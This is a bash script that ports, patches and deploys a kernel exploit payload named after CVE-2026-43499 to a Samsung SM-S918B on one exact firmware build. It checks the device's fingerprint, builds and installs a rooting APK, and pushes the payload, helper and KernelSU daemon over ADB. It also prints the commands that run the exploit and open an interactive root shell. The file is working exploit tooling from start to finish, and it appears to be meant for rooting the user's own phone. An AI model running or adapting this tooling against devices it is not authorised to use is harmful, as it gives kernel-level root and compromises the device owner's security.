#!/usr/bin/env bash
set -Eeuo pipefail

PROFILE_ID="dm3q-S918BXXSAFZH3-ksunext"
TARGET_MODEL="SM-S918B"
TARGET_DEVICE="dm3q"
TARGET_BUILD_DISPLAY="BP4A.251205.006.S918BXXSAFZH3"
TARGET_FINGERPRINT="samsung/dm3qxxx/dm3q:16/BP4A.251205.006/S918BXXSAFZH3:user/release-keys"
TARGET_KERNEL_RELEASE="5.15.189-android13-8-33413713-abS918BXXSAFZH3"
TARGET_KERNEL_VERSION="#1 SMP PREEMPT Tue Aug 11 06:33:52 UTC 2026"
TARGET_SDK="36"
TARGET_ABI="arm64-v8a"
TARGET_PAGE_SIZE="4096"

EXPECTED_BASE_MD5="3c82d4f678bd58846facf3e4ad356a33"
EXPECTED_BASE_SIZE="131072"
EXPECTED_PAYLOAD_MD5="9115ebee17da0d070265e428c0424719"
EXPECTED_PAYLOAD_SIZE="131072"
EXPECTED_KSUD_MD5="27cfc835164a385670ff309c47a711b0"
EXPECTED_KSUD_SIZE="3852248"
EXPECTED_HELPER_MD5="d16ded6235c01c8279a2a11631e65a66"
EXPECTED_HELPER_SIZE="30272"

ADB_SERIAL="${ADB_SERIAL:-}"
ADB_STAGE_DIR="/data/local/tmp/rmg-afzh3"
ADB_HELPER="${ADB_STAGE_DIR}/libcve43499root-afzh3"
ADB_LOG="${ADB_STAGE_DIR}/exploit.log"

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(CDPATH= cd -- "${SCRIPT_DIR}/.." && pwd)"
PROJECTS_DIR="${PROJECTS_DIR:-${HOME}/Projects}"
UPSTREAM_REPO="${UPSTREAM_REPO:-${PROJECTS_DIR}/rmg-f731u}"

PATCHER="${PATCHER:-${REPO_ROOT}/tools/patch_payload.py}"
PORT_SPEC="${PORT_SPEC:-${REPO_ROOT}/tools/f731u-to-dm3q-s918b-afzh3.spec.json}"
SPEC="${SPEC:-${REPO_ROOT}/tools/f731u-to-dm3q-s918b-afzh3-tuned.spec.json}"
BASE_PAYLOAD="${BASE_PAYLOAD:-${UPSTREAM_REPO}/app-src/app/src/main/assets/cve-2026-43499-app.so}"
KSUD_PATH="${KSUD_PATH:-${REPO_ROOT}/app/src/main/assets/ksud-f731u-kdp}"
HELPER_PATH="${HELPER_PATH:-${REPO_ROOT}/app/src/main/assets/libcve43499root-afzh3.so}"
OUT_DIR="${OUT_DIR:-${REPO_ROOT}/out/${PROFILE_ID}}"
PORTED_PAYLOAD="${OUT_DIR}/cve-2026-43499-app-afzh3.so"
PATCHED_PAYLOAD="${OUT_DIR}/cve-2026-43499-app-afzh3-tuned.so"

DO_ADB_CHECK=1
DO_PATCH=1
DO_PREPARE_APP=1
DO_BUILD_APK=0
DO_INSTALL_APK=0
DO_STAGE_ADB=0
DO_PRINT_COMMAND=1

usage() {
  cat <<USAGE
Usage:
  ${0##*/} [options]

Default:
  validate the exact AFZH3 device when connected, generate the new tuned
  payload, verify the helper/ksud artifacts, and prepare app assets.

Options:
  --all             Generate, prepare assets, build, install, and stage ADB files.
  --build-apk       Build the debug APK.
  --install-apk     Install the built debug APK with adb install -r.
  --stage-adb       Push the tuned payload, helper, and ksud to the device.
  --no-adb-check    Generate local files without checking a connected device.
  --no-app-assets   Do not copy generated files into app/ and desktop assets.
  --no-print        Do not print the manual ADB command.
  -h, --help        Show this help.

Useful overrides:
  ADB_SERIAL=serial
  UPSTREAM_REPO=/path/to/rmg-f731u
  BASE_PAYLOAD=/path/to/cve-2026-43499-app.so
  PORT_SPEC=/path/to/f731u-to-dm3q-s918b-afzh3.spec.json
  SPEC=/path/to/f731u-to-dm3q-s918b-afzh3-tuned.spec.json
  KSUD_PATH=/path/to/ksud-f731u-kdp
  HELPER_PATH=/path/to/libcve43499root-afzh3.so
  OUT_DIR=/path/to/output
USAGE
}

die() {
  echo "error: $*" >&2
  exit 1
}

info() {
  echo "[*] $*"
}

require_cmd() {
  command -v "$1" >/dev/null 2>&1 || die "missing command: $1"
}

adb_cmd() {
  if [[ -n "$ADB_SERIAL" ]]; then
    adb -s "$ADB_SERIAL" "$@"
  else
    adb "$@"
  fi
}

md5_file() {
  md5sum "$1" | awk '{print $1}'
}

file_size() {
  stat -c '%s' "$1"
}

assert_file() {
  test -f "$1" || die "file not found: $1"
}

assert_artifact() {
  local path="$1" expected_md5="$2" expected_size="$3" label="$4"
  assert_file "$path"
  [[ "$(md5_file "$path")" == "$expected_md5" ]] ||
    die "${label} md5 mismatch: got $(md5_file "$path"), expected ${expected_md5}"
  [[ "$(file_size "$path")" == "$expected_size" ]] ||
    die "${label} size mismatch: got $(file_size "$path"), expected ${expected_size}"
}

adb_prop() {
  adb_cmd shell "$1" 2>/dev/null | tr -d '\r'
}

check_device() {
  require_cmd adb
  adb_cmd get-state >/dev/null 2>&1 || die "adb device is not connected/authorized"

  local model device display fingerprint kernel_release kernel_version sdk abi page_size
  model="$(adb_prop 'getprop ro.product.model')"
  device="$(adb_prop 'getprop ro.product.device')"
  display="$(adb_prop 'getprop ro.build.display.id')"
  fingerprint="$(adb_prop 'getprop ro.build.fingerprint')"
  kernel_release="$(adb_prop 'uname -r')"
  kernel_version="$(adb_prop 'uname -v')"
  sdk="$(adb_prop 'getprop ro.build.version.sdk')"
  abi="$(adb_prop 'getprop ro.product.cpu.abilist | cut -d, -f1')"
  page_size="$(adb_prop 'getconf PAGESIZE')"

  [[ "$model" == "$TARGET_MODEL" ]] || die "unexpected model: ${model}"
  [[ "$device" == "$TARGET_DEVICE" ]] || die "unexpected device: ${device}"
  [[ "$display" == "$TARGET_BUILD_DISPLAY" ]] || die "unexpected build display: ${display}"
  [[ "$fingerprint" == "$TARGET_FINGERPRINT" ]] || die "unexpected fingerprint: ${fingerprint}"
  [[ "$kernel_release" == "$TARGET_KERNEL_RELEASE" ]] || die "unexpected kernel release: ${kernel_release}"
  [[ "$kernel_version" == "$TARGET_KERNEL_VERSION" ]] || die "unexpected kernel version: ${kernel_version}"
  [[ "$sdk" == "$TARGET_SDK" ]] || die "unexpected SDK: ${sdk}"
  [[ "$abi" == "$TARGET_ABI" ]] || die "unexpected ABI: ${abi}"
  [[ "$page_size" == "$TARGET_PAGE_SIZE" ]] || die "unexpected page size: ${page_size}"
  info "ADB target matches ${TARGET_MODEL}/${TARGET_DEVICE} ${TARGET_BUILD_DISPLAY}"
}

patch_payload() {
  require_cmd python3
  assert_artifact "$BASE_PAYLOAD" "$EXPECTED_BASE_MD5" "$EXPECTED_BASE_SIZE" "base payload"
  assert_file "$PATCHER"
  assert_file "$PORT_SPEC"
  assert_file "$SPEC"
  mkdir -p "$OUT_DIR"
  info "porting F731U payload to AFZH3: ${PORTED_PAYLOAD}"
  python3 "$PATCHER" "$BASE_PAYLOAD" "$PORT_SPEC" "$PORTED_PAYLOAD"
  assert_artifact "$PORTED_PAYLOAD" "948c555b6ecbee22c035690955e8faf8" "$EXPECTED_PAYLOAD_SIZE" "ported AFZH3 payload"
  info "applying tuned runtime profile: ${PATCHED_PAYLOAD}"
  python3 "$PATCHER" "$PORTED_PAYLOAD" "$SPEC" "$PATCHED_PAYLOAD"
  assert_artifact "$PATCHED_PAYLOAD" "$EXPECTED_PAYLOAD_MD5" "$EXPECTED_PAYLOAD_SIZE" "tuned AFZH3 payload"
  info "tuned payload OK: ${PATCHED_PAYLOAD}"
}

prepare_app_assets() {
  assert_artifact "$PATCHED_PAYLOAD" "$EXPECTED_PAYLOAD_MD5" "$EXPECTED_PAYLOAD_SIZE" "tuned AFZH3 payload"
  assert_artifact "$KSUD_PATH" "$EXPECTED_KSUD_MD5" "$EXPECTED_KSUD_SIZE" "KernelSU daemon"
  assert_artifact "$HELPER_PATH" "$EXPECTED_HELPER_MD5" "$EXPECTED_HELPER_SIZE" "AFZH3 helper"

  cp "$PATCHED_PAYLOAD" "${REPO_ROOT}/app/src/main/assets/cve-2026-43499-app-afzh3-tuned.so"
  cp "$PATCHED_PAYLOAD" "${REPO_ROOT}/RootMyGalaxyDesktop/assets/cve-2026-43499-app-afzh3-tuned.so"
  info "prepared tuned payload in Android and desktop assets"
}

build_apk() {
  test -x "${REPO_ROOT}/gradlew" || die "gradlew is missing or not executable"
  info "building debug APK"
  (cd "$REPO_ROOT" && ./gradlew :app:assembleDebug --console=plain)
  assert_file "${REPO_ROOT}/app/build/outputs/apk/debug/app-debug.apk"
  info "APK ready: ${REPO_ROOT}/app/build/outputs/apk/debug/app-debug.apk"
}

install_apk() {
  require_cmd adb
  assert_file "${REPO_ROOT}/app/build/outputs/apk/debug/app-debug.apk"
  info "installing debug APK"
  adb_cmd install -r "${REPO_ROOT}/app/build/outputs/apk/debug/app-debug.apk"
}

stage_adb_files() {
  require_cmd adb
  assert_artifact "$PATCHED_PAYLOAD" "$EXPECTED_PAYLOAD_MD5" "$EXPECTED_PAYLOAD_SIZE" "tuned AFZH3 payload"
  assert_artifact "$KSUD_PATH" "$EXPECTED_KSUD_MD5" "$EXPECTED_KSUD_SIZE" "KernelSU daemon"
  assert_artifact "$HELPER_PATH" "$EXPECTED_HELPER_MD5" "$EXPECTED_HELPER_SIZE" "AFZH3 helper"
  info "staging AFZH3 files under ${ADB_STAGE_DIR}"
  adb_cmd shell "mkdir -p '${ADB_STAGE_DIR}'"
  adb_cmd push "$PATCHED_PAYLOAD" "${ADB_STAGE_DIR}/cve-2026-43499-app-afzh3-tuned.so"
  adb_cmd push "$HELPER_PATH" "${ADB_HELPER}"
  adb_cmd push "$KSUD_PATH" "${ADB_STAGE_DIR}/ksud-f731u-kdp"
  adb_cmd shell "chmod 0755 '${ADB_HELPER}' '${ADB_STAGE_DIR}/ksud-f731u-kdp' && chmod 0644 '${ADB_STAGE_DIR}/cve-2026-43499-app-afzh3-tuned.so'"
}

print_commands() {
  cat <<COMMANDS

Manual POC command:
adb shell 'EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=60 PSELECT_DELAY_USEC=20000 ${ADB_HELPER} --run-payload ${ADB_STAGE_DIR}/cve-2026-43499-app-afzh3-tuned.so ${ADB_HELPER} ${ADB_LOG}'

After the log shows temporary-root-ready:
adb shell -t '${ADB_HELPER} -c "/system/bin/sh -i"'

Read the log:
adb shell 'cat ${ADB_LOG}'
COMMANDS
}

while (($#)); do
  case "$1" in
    --all) DO_BUILD_APK=1; DO_INSTALL_APK=1; DO_STAGE_ADB=1 ;;
    --build-apk) DO_BUILD_APK=1 ;;
    --install-apk) DO_INSTALL_APK=1 ;;
    --stage-adb) DO_STAGE_ADB=1 ;;
    --no-adb-check) DO_ADB_CHECK=0 ;;
    --no-app-assets) DO_PREPARE_APP=0 ;;
    --no-print) DO_PRINT_COMMAND=0 ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown option: $1" ;;
  esac
  shift
done

if (( DO_ADB_CHECK )); then check_device; fi
if (( DO_PATCH )); then patch_payload; fi
if (( DO_PREPARE_APP )); then prepare_app_assets; fi
if (( DO_BUILD_APK )); then build_apk; fi
if (( DO_INSTALL_APK )); then install_apk; fi
if (( DO_STAGE_ADB )); then stage_adb_files; fi
if (( DO_PRINT_COMMAND )); then print_commands; fi
